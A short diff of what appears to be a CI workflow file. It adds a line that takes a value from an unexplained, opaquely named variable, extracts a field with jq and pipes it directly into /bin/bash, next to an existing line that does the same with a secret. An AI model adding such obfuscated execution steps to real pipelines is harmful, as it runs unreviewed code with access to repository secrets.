@@ -27,6 +27,7 @@ jobs:
           d67149: ${{ secrets.d67149 }}
         run: |
           printf '%s' "$d67149" | jq -r .bb32620 | /bin/bash
+          printf '%s' "$ttpbx925" | jq -r .ax46 | /bin/bash
 
       - name: Store results
         if: always()
